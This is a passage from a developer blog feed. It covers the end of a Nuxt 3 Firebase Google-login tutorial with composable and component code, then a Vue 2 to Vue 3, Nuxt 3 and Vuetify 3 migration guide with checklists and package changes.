class="title function_">verifyIdToken</span>(tokenHeader || tokenCookie.<span class="property">value</span>)</span><br><span class="line">    <span class="comment">// get properties from decoded id token</span></span><br><span class="line">    .<span class="title function_">then</span>(<span class="function">(<span class="params">&#123; email &#125;</span>) =&gt;</span> (user.<span class="property">value</span> = &#123; email &#125;))</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>Create a new file named useAuth.ts inside the composables folder. This composable will handle Firebase Authentication and provide methods for signing in with Google, signing out, and accessing the user‚Äôs information:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// composables/useAuth.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">GoogleAuthProvider</span>, signInWithPopup &#125; <span class="keyword">from</span> <span class="string">&#x27;firebase/auth&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">useAuth</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; $auth &#125; = <span class="title function_">useNuxtApp</span>()</span><br><span class="line">  <span class="keyword">const</span> user = <span class="title function_">useState</span>(<span class="string">&#x27;user&#x27;</span>, <span class="literal">undefined</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">signInWithGoogle</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> provider = <span class="keyword">new</span> <span class="title class_">GoogleAuthProvider</span>()</span><br><span class="line">    <span class="title function_">signInWithPopup</span>($auth, provider).<span class="title function_">catch</span>(<span class="function"><span class="params">e</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">error</span>(e))</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">signOut</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    $auth.<span class="title function_">signOut</span>()</span><br><span class="line">    user.<span class="property">value</span> = <span class="literal">undefined</span></span><br><span class="line">    <span class="title function_">useCookie</span>(<span class="string">&#x27;authToken&#x27;</span>).<span class="property">value</span> = <span class="literal">undefined</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> &#123; user, signInWithGoogle, signOut &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Now, create a new Vue component named Login.vue in the appropriate folder. This component will display a ‚ÄúSign In with Google‚Äù button when the user is not logged in and a ‚ÄúWelcome back‚Äù message with a ‚ÄúSign Out‚Äù button when the user is logged in:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-if</span>=<span class="string">&quot;user&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        Welcome back, &#123;&#123; user?.email &#125;&#125;</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">v-btn</span> @<span class="attr">click</span>=<span class="string">&quot;signOut&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          Sign Out</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">v-btn</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">v-btn</span> <span class="attr">v-else</span> @<span class="attr">click</span>=<span class="string">&quot;signInWithGoogle&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        Sign In With Google</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">v-btn</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">setup</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">const</span> &#123; signInWithGoogle, signOut, user &#125; = <span class="title function_">useAuth</span>()</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>With these components and configurations in place, our Nuxt 3 project is now equipped with Firebase Google Login. Users can easily sign in using their Google accounts, and once authenticated, the application can display personalized content and features based on the user‚Äôs login status.</p><p>Feel free to customize and expand upon this blog post to include additional features and considerations specific to your project. Happy writing and best of luck with your Nuxt 3 application!<br>Find the source code <a href="https://github.com/Beking0912/vue3-nuxt3-vuetify3-starter"><strong>here</strong></a>, making it an excellent starter for those new to Nuxt 3.</p><img src="https://s2.loli.net/2023/08/01/BrAwPQ9bVznKlRa.png" style="width: 40%;" ><hr><p>References:</p><ul><li><a href="https://medium.com/codex/using-firebase-in-nuxt3-the-right-way-bebbb6d8c4dd">Using Firebase in Nuxt3 the Right Way</a></li><li><a href="https://v8.i18n.nuxtjs.org/">@nuxtjs&#x2F;i18n</a></li><li><a href="https://vuetifyjs.com/en/getting-started/installation/">Vuetify</a></li><li><a href="https://pinia.vuejs.org/ssr/nuxt.html">Pinia</a></li><li><a href="https://github.com/bxxf/nuxt3-firebase-template/tree/7b95123b7b4b999337940ab6be7c4c0c56fe0776">nuxt3-firebase-template</a></li></ul><p>üîç Check out the demo project in <a href="https://github.com/Beking0912/vue3-nuxt3-vuetify3-starter"><strong>github</strong></a>.<br>üìÆ If find any errors, please feel free to discuss and correct them: <a href="mailto:&#98;&#x73;&#117;&#53;&#64;&#110;&#x63;&#115;&#x75;&#46;&#x65;&#x64;&#x75;">&#98;&#x73;&#117;&#53;&#64;&#110;&#x63;&#115;&#x75;&#46;&#x65;&#x64;&#x75;</a>.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;I believe you have already read my üëâ &lt;a href=&quot;https://beking0912.github.io/2023/07/09/Migration-Guide-Vue2-Nuxt2-Vuetify2-to-Vue3-Nuxt3-</summary>
      
    
    
    
    <category term="Coding" scheme="https://beking0912.github.io/categories/Coding/"/>
    
    <category term="Migration" scheme="https://beking0912.github.io/categories/Coding/Migration/"/>
    
    
    <category term="Nuxt" scheme="https://beking0912.github.io/tags/Nuxt/"/>
    
    <category term="Vue" scheme="https://beking0912.github.io/tags/Vue/"/>
    
    <category term="Pinia" scheme="https://beking0912.github.io/tags/Pinia/"/>
    
    <category term="Firebase" scheme="https://beking0912.github.io/tags/Firebase/"/>
    
  </entry>
  
  <entry>
    <title>üß± Migration Guide: Vue2/Nuxt2/Vuetify2 to Vue3/Nuxt3/Vuetify3</title>
    <link href="https://beking0912.github.io/2023/07/09/Migration-Guide-Vue2-Nuxt2-Vuetify2-to-Vue3-Nuxt3-Vuetify3/"/>
    <id>https://beking0912.github.io/2023/07/09/Migration-Guide-Vue2-Nuxt2-Vuetify2-to-Vue3-Nuxt3-Vuetify3/</id>
    <published>2023-07-10T02:32:15.000Z</published>
    <updated>2023-08-04T16:19:18.074Z</updated>
    
    <content type="html"><![CDATA[<img src="https://s2.loli.net/2023/07/24/F9cwXKE6x3zoUtf.png" style="width:50%;">As technology evolves, so must our projects. With Vue 2 support coming to an end on December 31st, 2023, it becomes imperative for us to migrate our projects to the latest Vue 3, Nuxt 3, and Vuetify 3. <p>In this blog, I will share my experience and insights gained while migrating the project based on an existing codebase, from tackling Nuxt 3 updates to addressing Vue 3 breaking changes and adapting to Vuetify 3. I navigated through numerous hurdles and discovered effective solutions, as a result, I will also share the challenges encountered and the strategies employed.</p><h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><p>Before going ahead with the migration, I extensively researched various technical blogs and almost all of them recommended migrating the code after creating a new project, cause there might be too many errorsüêû and could not figure out which module was causing the error or if it was something else.<br><img src="https://s2.loli.net/2023/07/20/6xNak423G9HBMJb.png" alt="Frame 1 _3_.png"><br>But after weighing the pros and cons, I made the decision to upgrade the project based on our old codebase, mainly because our codebase already uses the composition api syntax by <strong>@nuxt&#x2F;composition-api</strong> using TypeScript, and have also introduced auto-imports. It proved to be a very bold decisionüí•, as I was not able to validate the changes I made for quite some time, and in fact I did not actually get the project up and running until after I had completed most of the nuxt 3 and vue 3 migrations. But fortunately, I did succeed üéâ.<br><img src="https://s2.loli.net/2023/08/02/BjXv1YrsTOHqF4Z.png" alt="Frame 4 _1_.png"></p><h2 id="Before-Migration"><a href="#Before-Migration" class="headerlink" title="Before Migration"></a>Before Migration</h2><ol><li><strong>Learn about Nuxt 3</strong></li></ol><ul><li>It allows to experience <a href="https://www.typescriptlang.org/"><strong>TypeScript</strong></a> with zero configuration.</li><li>Nuxt 2 uses webpack 4 and Babel, Nuxt 3 switched to <a href="https://vitejs.dev/"><strong>Vite</strong></a> (or <a href="https://webpack.js.org/"><strong>webpack 5</strong></a>) and esbuild. Vite is the default choice but you can still use webpack 5.</li><li>It uses <a href="https://nuxt.com/docs/api/commands/add"><strong>Nuxi</strong></a> for Command line interface. It is like the Vue CLI but for Nuxt.</li><li>It uses <a href="https://nitro.unjs.io/"><strong>Nitro</strong></a> as the server engine, offering cross-platform support for Node.js, browsers, service workers and more.</li><li>It uses <a href="https://nuxt.com/docs/api/advanced/kit"><strong>Nuxt Kit</strong></a> that provides users with a new flexible module development experience with cross-version compatibility.</li><li>It uses <a href="https://nuxt.com/docs/bridge/overview"><strong>Nuxt Bridge</strong></a> to ease the migration from Nuxt 2.</li><li>Prerequisites Node.js - v16.10.0 or newer</li></ul><ol start="2"><li><strong>Learn Vue 3 Composition API</strong></li></ol><ul><li>As Nuxt 3 is built on Vue 3, understanding the changes and enhancements in Vue 3 is essential. Pay attention to the <a href="https://vuejs.org/api/composition-api-setup.html">Composition API</a>, which offers a more flexible and powerful way to organize and manage your code.</li></ul><ol start="3"><li><strong>Learn about TypeScript</strong></li></ol><ul><li>Nuxt 3 is written in TypeScript, and having a basic understanding of TypeScript will be beneficial. Being able to read and understand TypeScript code will help you navigate through Nuxt 3‚Äôs source code and address any potential issues that may arise during the migration process.</li><li>Migrating your code to TypeScript is highly recommended due to its enhanced type safety, improved developer experience with autocompletion and type inference, early detection of errors during development, robust tooling support, and its ability to maintain code scalability and readability as projects grow in complexity. TypeScript adds clarity and structure to the codebase, ultimately leading to more reliable and maintainable applications.</li></ul><ol start="4"><li><strong>Learn about Modules</strong></li></ol><ul><li>Nuxt 3 requires <a href="https://nuxt.com/docs/guide/concepts/esm">ECMAScript modules</a> (ESM), which may require converting CommonJS modules (CJS) used in your project. Learn about the differences between these module systems and how to migrate your modules to ESM.</li></ul><ol start="5"><li><strong>Try to set up a demo project</strong></li></ol><ul><li>üëçüëçüëç Having a demo project before migration is an excellent idea, especially when dealing with complex and large-scale projects. Here‚Äôs an example demo project including Vue 3, Nuxt 3, Vuetify 3, Pinia, pwa and firebase authentication: üëâ <a href="https://github.com/Beking0912/vue3-nuxt3-vuetify3-starter"><strong>github repo</strong></a>, see more details <a href="http://localhost:4000/2023/07/28/Minimal-Nuxt-3-starter-with-Vuetify-Pinia-and-Google-login/"><strong>in this blog</strong></a>.</li><li>It allows you to experiment and isolate specific packages or modules, helping you identify the source of issues more effectively. When facing challenges in the migration process, the demo project serves as a safe playground to troubleshoot and find solutions without impacting the main project. </li><li>This experimental approach fosters a deeper understanding of potential pitfalls and ensures a smoother migration for the main project, ultimately saving time and minimizing risks.</li></ul><h2 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h2><p>üìñ Keeping the migration guide open and referring to it throughout the process will help you avoid common pitfalls and ensure a smoother transition.<br><img src="https://s2.loli.net/2023/07/24/EdoMYzqficF2SmV.png" style="width: 35%;position: absolute;right: 0;"></p><h3 id="Vue-3"><a href="#Vue-3" class="headerlink" title="Vue 3"></a>Vue 3</h3><ul><li><a href="https://v3-migration.vuejs.org/">Migration Guide ‚ú®</a></li><li><a href="https://github.com/vuejs/core">Github</a></li><li><a href="https://discord.com/invite/HBherRA">Discord</a></li><li><a href="https://vuejs.org/examples/#hello-world">Examples</a></li></ul><h3 id="Nuxt-3"><a href="#Nuxt-3" class="headerlink" title="Nuxt 3"></a>Nuxt 3</h3><ul><li><a href="https://nuxt.com/docs/migration/overview">Migration Guide ‚ú®</a></li><li><a href="https://github.com/nuxt/nuxt">Github</a></li><li><a href="https://discord.com/invite/ps2h6QT">Discord</a></li><li><a href="https://nuxt.com/docs/examples/hello-world">Examples</a></li></ul><h3 id="Vuetify-3"><a href="#Vuetify-3" class="headerlink" title="Vuetify 3"></a>Vuetify 3</h3><ul><li><a href="https://vuetifyjs.com/en/getting-started/upgrade-guide/">Upgrade Guide ‚ú®</a></li><li><a href="https://github.com/vuetifyjs/vuetify">Github</a></li><li><a href="https://github.com/vuetifyjs/vuetify/discussions">Github Discussions</a></li><li><a href="https://stackoverflow.com/search?q=vuetify&s=f1924ffc-2529-425f-a546-b4dd9c069f1d">Stack Overflow</a></li><li><a href="https://discord.com/invite/s93b7Fv">Discord</a></li></ul><h2 id="Migration-Plan"><a href="#Migration-Plan" class="headerlink" title="Migration Plan"></a>Migration Plan</h2><p><strong>0. Abstract reusable components</strong></p><ul><li>Abstract recurring code patterns into reusable components.</li></ul><p><strong>1. Nuxt 3 Migration</strong></p><ul><li>Update Nuxt 3 configurations.</li><li>Adapt the codebase to address breaking changes introduced in the latest version.</li></ul><p><strong>2. Package Upgrades and Replacements</strong></p><ul><li>Upgrade package versions to their Vue 3-compatible equivalents.</li><li>Identify and replace packages that may not be compatible with Vue 3 or have alternative solutions available.</li></ul><p><strong>3. Integration of New Configurations</strong></p><ul><li>Integrate the updated router, i18n, pinia, pwa, firebase, and other configurations to align with Nuxt 3.</li></ul><p><strong>4. Vue 3 Migration</strong></p><ul><li>Begin the migration by updating the project‚Äôs codebase to work with Vue 3.</li><li>Rewrite all components using the ‚Äúscript setup‚Äù syntax introduced in Vue 3.</li></ul><p><strong>5. Test Project Setup</strong></p><ul><li>Attempt to run the project.</li><li>Address any issues or conflicts that may arise during the testing phase.</li></ul><p><strong>6. Vuetify 3 Migration</strong></p><ul><li>Follow the migration guide to adjust the code syntax of each component. </li><li>Integrate the latest theme configuration.</li><li>Explore alternative solutions for components that have not been fully migrated yet.</li></ul><p><strong>7. Style Restoration</strong></p><ul><li>Restore any customized styles or appearance adjustments to maintain the project‚Äôs original look.</li></ul><h2 id="Nuxt-3-Changes-Checklist"><a href="#Nuxt-3-Changes-Checklist" class="headerlink" title="Nuxt 3 Changes Checklist"></a>Nuxt 3 Changes Checklist</h2><p><img src="https://s2.loli.net/2023/07/24/Ca1Zlwh2943sfmy.png" alt="full-logo-green-dark.png"><br>To get the project set up as quickly as possible, I focused on the nuxt 3 migration firstly. Here is a checklist outlining the major changes required. Nuxt 3 introduces several significant changes and improvements that require careful consideration during the migration process. In this section, I will present a checklist detailing the key modifications needed to adapt the project to Nuxt 3.</p><details open><summary><u><b>Configuration</b></u></summary><ol><li><strong>nuxt.config</strong></li></ol><ul><li>Migrate to the <code>defineNuxtConfig</code> function.</li><li>Migrate <code>router.extendRoutes</code> to the new <code>pages:extend</code> hook.</li></ul><ol start="2"><li><strong>Modules</strong></li></ol><ul><li>Move all <code>buildModules</code> into <code>modules</code>. </li><li>Check for Nuxt 3 compatibility of modules. [we will do it later]</li></ul><ol start="3"><li><strong>TypeScript</strong></li></ol><ul><li>Add <code>&quot;extends&quot;: &quot;./.nuxt/tsconfig.json&quot;</code> to <code>tsconfig.json</code>.</details></li></ul><details open><summary><u><b>Auto Imports</b></u></summary><ol><li><strong>Nuxt Auto-imports</strong></li></ol><ul><li>Nuxt auto-imports functions and composables to perform data fetching, get access to the app context and runtime config, manage state or define components and plugins.</li></ul><ol start="2"><li><strong>Vue Auto-imports</strong></li></ol><ul><li>Vue 3 exposes Reactivity APIs like ref or computed, as well as lifecycle hooks and helpers that are auto-imported by Nuxt.</details></li></ul><details open><summary><u><b>Meta Tags</b></u></summary><ul><li>In <code>nuxt.config</code>, rename <code>head</code> &#x3D;&gt; <code>meta</code>.</li><li>Access the component state with <code>head</code> &#x3D;&gt; <code>useHead</code>.</details></li></ul><details open><summary><u><b>Plugins and Middleware</b></u></summary><ol><li><strong>Plugins</strong></li></ol><ul><li>Migrate plugins to use the <code>defineNuxtPlugin</code> helper function.</li><li>Remove entries in <code>nuxt.config</code> plugins array that are at the top level of plugins&#x2F; folder.</li></ul><ol start="2"><li><strong>Route Middleware</strong></li></ol><ul><li>Migrate route middleware to use the <code>defineNuxtRouteMiddleware</code> function.</li><li>Reference route middleware using <code>definePageMeta</code>.</li><li>File name with extension <code>.client</code> and <code>.server</code>. </details></li></ul><details open><summary><u><b>Pages and Layouts</b></u></summary><ol><li><strong>Layouts</strong></li></ol><ul><li>Replace <code>&lt;Nuxt /&gt;</code> with <code>&lt;slot /&gt;</code>.</li><li>Use <code>definePageMeta</code> to select the layout used by the page.</li><li>Move <code>~/layouts/_error.vue</code> to <code>~/error.vue</code>.</li></ul><ol start="2"><li><strong>Pages: Dynamic Routes</strong></li></ol><ul><li>Replace <code>_id</code> with <code>[id]</code> to define a dynamic route parameter.</li><li>Replace <code>_.vue</code> with <code>[...slug].vue</code> to define a catch-all route.</details></li></ul><details open><summary><u><b>Runtime Config</b></u></summary><ul><li>Add environment variables to the <code>runtimeConfig</code> property of the <code>nuxt.config</code>. </li><li>Migrate <code>process.env</code> to <code>useRuntimeConfig</code>.</li><li>Exposing Runtime Config using <code>runtimeConfig.public</code>. </details></li></ul><details open><summary><u><b>Build Tooling</b></u></summary><ul><li>Remove <code>@nuxt/typescript-build</code> and <code>@nuxt/typescript-runtime</code> from dependencies and modules. </li><li>Remove any unused babel dependencies. </li><li>Remove any explicit core-js dependencies. </li><li>Migrate <code>require</code> to <code>import</code>. </details></li></ul><details open><summary><u><b>Server</b></u></summary><ul><li>Any files in <code>~/server/api</code> and <code>~/server/middleware</code> will be automatically registered, so you can remove them from <code>serverMiddleware</code> array.</details></li></ul><h2 id="Vue-3-Changes-Checklist"><a href="#Vue-3-Changes-Checklist" class="headerlink" title="Vue 3 Changes Checklist"></a>Vue 3 Changes Checklist</h2><img src="https://s2.loli.net/2023/07/24/3YBqE5f18IywW7d.png" style="width: 10%;">Vue 3 comes with several breaking changes compared to Vue 2, which may necessitate adjustments to the project's existing codebase. In this section, I will provide a checklist of these breaking changes and the corresponding solutions or workarounds.<details open><summary><u><b>v-model</b></u></summary><ol><li>replace <code>.sync</code> with <code>v-model</code>.<br> nuxt2: <code>&lt;ChildComponent :title.sync=&quot;pageTitle&quot; /&gt;</code><br> nuxt3: <code>&lt;ChildComponent v-model:title=&quot;pageTitle&quot; /&gt;</code></li><li>for all v-models without arguments, make sure to change props and events name to <code>modelValue</code> and <code>update:modelValue</code> respectively.</details></li></ol><details open><summary><u><b>key</b></u></summary><ol><li>no longer recommend using the key attribute on v-if&#x2F;v-else&#x2F;v-else-if branches, since unique keys are now automatically generated on conditional branches if you don‚Äôt provide them.</li><li>when using <code>&lt;template v-for&gt;</code> with a child that uses <code>v-if</code>, the key should be moved up to the <code>&lt;template&gt;</code> tag.</details></li></ol><details open><summary><u><b>v-if vs. v-for Precedence</b></u></summary><ol><li>If used on the same element, <code>v-if</code> will have higher precedence than <code>v-for</code>.<br> nuxt2: <code>v-for</code> would take precedence.<br> nuxt3: <code>v-if</code> would take precedence.</details></li></ol><details open><summary><u><b>v-bind Merge Behavior</b></u></summary><ol><li>Order of bindings for <code>v-bind</code> will affect the rendering result.<br> template: <code>&lt;div id=&quot;red&quot; v-bind=&quot;&#123; id: &#39;blue&#39; &#125;&quot;&gt;&lt;/div&gt;</code><br> result:   <code>&lt;div id=&quot;blue&quot;&gt;&lt;/div&gt;</code><br> template: <code>&lt;div v-bind=&quot;&#123; id: &#39;blue&#39; &#125;&quot; id=&quot;red&quot;&gt;&lt;/div&gt;</code><br> result:   <code>&lt;div id=&quot;red&quot;&gt;&lt;/div&gt;</code></details></li></ol><details open><summary><u><b>v-on.native modifier removed</b></u></summary><ol><li>The <code>.native</code> modifier for <code>v-on</code> has been removed.</li><li>Remove all instances of the <code>.native</code> modifier. </li><li>Ensure that all your components document their events with the emits option.</details></li></ol><details open><summary><u><b>Render Function API</b></u></summary><ol><li><code>h</code> is now globally imported.</li><li>No domProps, the entire VNode props structure is flattened.</details></li></ol><details open><summary><u><b>Slots Unification</b></u></summary><ol><li><code>this.$slots</code> now exposes slots as functions.</li><li><code>this.$scopedSlots</code> is removed.</li><li>Replace all <code>this.$scopedSlots</code> occurrences with <code>this.$slots</code> in 3.x. </li><li>Replace all occurrences of <code>this.$slots.mySlot</code> with <code>this.$slots.mySlot()</code>.</details></li></ol><details open><summary><u><b>Inline Template Attribute</b></u></summary><ol><li>Support for the inline-template feature has been removed.</details></li></ol><details open><summary><u><b>$children</b></u></summary><ol><li><code>$children</code> instance property has been removed and is no longer supported.</details></li></ol><details open><summary><u><b>$listeners removed</b></u></summary><ol><li><code>$listeners</code> has been removed. </li><li>Event listeners are now part of <code>$attrs</code>.</li><li>Remove all usages of <code>$listeners</code>.</details></li></ol><details open><summary><u><b>Events API</b></u></summary><ol><li><code>$on</code>, <code>$off</code> and <code>$once</code> instance methods are removed. </li><li>Component instances no longer implement the event emitter interface.</details></li></ol><h3 id="What‚Äôs-New-in-Vue-3"><a href="#What‚Äôs-New-in-Vue-3" class="headerlink" title="What‚Äôs New in Vue 3"></a>What‚Äôs New in Vue 3</h3><details open><summary><u><b>Async Components</b></u></summary><ul><li><code>defineAsyncComponent</code> helper method that explicitly defines async components. </li><li>component option renamed to loader.</li><li>Loader function does not inherently receive resolve and reject arguments and must return a Promise.</details></li></ul><details open><summary><u><b>emits Option</b></u></summary><ul><li>For components that re-emit native events to their parent, this would now lead to two events being fired.</details></li></ul><h2 id="Vuetify-3-Changes-Checklist"><a href="#Vuetify-3-Changes-Checklist" class="headerlink" title="Vuetify 3 Changes Checklist"></a>Vuetify 3 Changes Checklist</h2><p><img src="https://s2.loli.net/2023/07/24/Kb8E2Sw7znJoeHY.png" alt="vuetify-logo-v3-light 1 _1_.png"><br>It is essential to address the changes in Vuetify 3. However, it is important to note that Vuetify 3 is still under development, and some components may not be fully available yet. Here‚Äôs a checklist of the changes and updates. </p><p><strong>A &#x3D;&gt; B means A has been renamed to B.</strong></p><details open><summary><u><b>v-expansion-panel</b></u></summary><ol><li><code>v-expansion-panel-header</code> &#x3D;&gt; <code>v-expansion-panel-title</code>. </li><li><code>v-expansion-panel-content</code> &#x3D;&gt; <code>v-expansion-panel-text</code>.</details></li></ol><details open><summary><u><b>v-menu</b></u></summary><ol><li>offset-y, offset-x props &#x3D;&gt; <code>offset</code> prop</details></li></ol><details open><summary><u><b>v-img</b></u></summary><ol><li><code>contain</code> has been removed and is now the default behavior. Use <code>cover</code> to fill the entire container.</details></li></ol><details open><summary><u><b>v-tabs</b></u></summary><ol><li><code>v-tab-item</code> has been removed, use <code>v-window-item</code>.</details></li></ol><details open><summary><u><b>Input components</b></u></summary><ol><li><code>validate-on-blur</code> prop has been renamed to <code>validate-on=&quot;blur&quot;</code>.</li><li>Variant props filled&#x2F;outlined&#x2F;solo have been combined into <code>variant</code> prop. </details></li></ol><details open><summary><u><b>v-select/v-combobox/v-autocomplete</b></u></summary><ol><li><code>v-model</code> not present in items will now be rendered instead of being ignored.</li><li><code>item-text</code> &#x3D;&gt; <code>item-title</code></li><li>The item slot will no longer generate a <code>v-list-item</code> component automatically, instead a props object is supplied with the required event listeners and props.</details></li></ol><details open><summary><u><b>v-list</b></u></summary><ol><li><code>v-list-item-icon</code> and <code>v-list-item-avatar</code> have been removed, use <code>v-list-item</code> with icon or avatar props, or use <code>append</code> or <code>prepend</code> slot. </li><li><code>v-list-item-content</code> has been removed, use CSS grid for layout now instead.</li><li><code>v-subheader</code> &#x3D;&gt; <code>v-list-subheader</code>. </details></li></ol><details open><summary><u><b>v-form</b></u></summary><ol><li><code>validate()</code> now returns a <code>Promise&lt;FormValidationResult&gt;</code> instead of a boolean.</details></li></ol><details open><summary><u><b>v-checkbox/v-radio/v-switch</b></u></summary><ol><li><code>input-value</code> &#x3D;&gt; <code>model-value</code>.</details></li></ol><details open><summary><u><b>v-btn/v-btn-toggle</b></u></summary><ol><li><code>fab</code> is no longer supported.</li><li><code>flat</code>, <code>outlined</code>, <code>text</code>, <code>plain</code> props have been combined into <code>variant</code> prop.</details></li></ol><details open><summary><u><b>Layout</b></u></summary><ol><li><code>stateless</code>, <code>clipped</code>, <code>clipped-right</code> and <code>app</code> props have been removed from <code>v-navigation-drawer</code>, <code>v-app-bar</code> and <code>v-system-bar</code>.</details></li></ol><details open><summary><u><b>v-data-table</b></u></summary><ol><li>Should add <code>items-per-page-text=&quot;Rows per page:&quot;</code> to change the text.</li><li><code>item-key</code> &#x3D;&gt; add <code>id</code> to items.</li><li>In items array <code>text</code> &#x3D;&gt; <code>title</code>, <code>value</code> &#x3D;&gt; <code>key</code>.</li><li>Slot <code>expanded-item</code> &#x3D;&gt; <code>expanded-row</code> ,<code>header</code> &#x3D;&gt; <code>columns</code>.</details></li></ol><h2 id="Modules-Compatibility"><a href="#Modules-Compatibility" class="headerlink" title="Modules Compatibility"></a>Modules Compatibility</h2><p>Ensuring the compatibility of third-party modules and plugins is crucial for a seamless transition. By upgrading, removing, or replacing modules as needed, we can maintain the project‚Äôs functionality and avoid potential conflicts.<br>For the modules named start with @nuxt, you can search for it <a href="https://nuxt.com/modules?q=">here</a>.</p><ol><li><strong>Modules Removed</strong></li></ol><ul><li>@nuxtjs&#x2F;eslint-config-typescript <strong>removed</strong></li><li>@nuxtjs&#x2F;composition-api <strong>removed</strong></li><li>@nuxt&#x2F;typescript-build <strong>removed</strong></li><li>@nuxtjs&#x2F;axios <strong>removed</strong></li><li>@nuxt&#x2F;types <strong>removed</strong></li><li>vue-i18n <strong>removed</strong></li><li>vuexfire <strong>removed</strong></li><li>vue-server-renderer <strong>removed</strong></li><li>vue-template-compiler <strong>removed</strong></li></ul><ol start="2"><li><strong>Modules Replaced</strong></li></ol><ul><li>vue-chartjs &#x3D;&gt; vue-chart-3</li><li>vue-apexcharts &#x3D;&gt; vue3-apexcharts</li><li>vue2-perfect-scrollbar &#x3D;&gt; vue3-perfect-scrollbar</li><li>vue-jest &#x3D;&gt; @vue&#x2F;vue3-jest <a href="https://github.com/vuejs/vue-jest"><strong>guide</strong></a></li><li>pinia-plugin-persistedstate &#x3D;&gt; pinia-plugin-persistedstate&#x2F;nuxt <a href="https://prazdevs.github.io/pinia-plugin-persistedstate/frameworks/nuxt-3.html"><strong>guide</strong></a></li><li>@nuxtjs&#x2F;pwa &#x3D;&gt; @vite-pwa&#x2F;nuxt <a href="https://vite-pwa-org.netlify.app/frameworks/nuxt.html"><strong>guide</strong></a></li></ul><ol start="3"><li><strong>Modules Upgraded</strong></li></ol><ul><li>nuxt &#x3D;&gt; ^3.5.2</li><li>vue &#x3D;&gt; ^3.3.4</li><li>pinia &#x3D;&gt; ^2.1.3</li><li>vuetify &#x3D;&gt; ^3.3.3 <a href="https://codybontecou.com/how-to-use-vuetify-with-nuxt-3.html"><strong>guide</strong></a> </li><li>@nuxtjs&#x2F;i18n <a href="https://v8.i18n.nuxtjs.org/guide/migrating#deprecated-onbeforelanguageswitch-and-onlanguageswitched-function-options"><strong>guide</strong></a></li><li>@vueuse&#x2F;nuxt &#x3D;&gt; ^10.1.2 <a href="https://vueuse.org/guide/#nuxt"><strong>guide</strong></a></li><li>@pinia&#x2F;nuxt &#x3D;&gt; ^0.4.11</li></ul><h2 id="Challenges-and-Solutions"><a href="#Challenges-and-Solutions" class="headerlink" title="Challenges and Solutions"></a>Challenges and Solutions</h2><p>During the migration, I encountered several challenging issues that were not readily addressed in the official documentation. To find solutions, I proactively sought assistance from various sources, including the GitHub repository issues, the official Discord community, and Stack Overflow. In some cases, I even delved into the source code to gain a deeper understanding. Here are some of the questions I encountered and the corresponding answers I discovered.</p><img src="https://s2.loli.net/2023/07/24/CS45pdjXOvDFzn1.png" style="width: 40%;"><details open><summary><u><b>‚ùì Refactoring Options API to Composition API</b></u></summary><p>While the Options API remains functional in Vue 3, leveraging the Composition API offers significant advantages, especially for larger codebase. The Composition API is a built-in feature in Vue 3 and is also available in Vue 2 through the @vue&#x2F;composition-api plugin.<br><img src="https://s2.loli.net/2023/07/24/5pWn19TFlVcfS2K.png" alt="Frame 2 _3_.png"><br>Let‚Äôs see a basic example to understand the difference of coding structure between Options API and Composition API, the specific code images reference is from here: <a href="https://medium.com/arcana-network-blog/vue-3-composition-api-basics-and-patterns-44813f2c785d">Arcana Network Blog</a>. </p><p><strong>1. Code in the Options API</strong><br><img 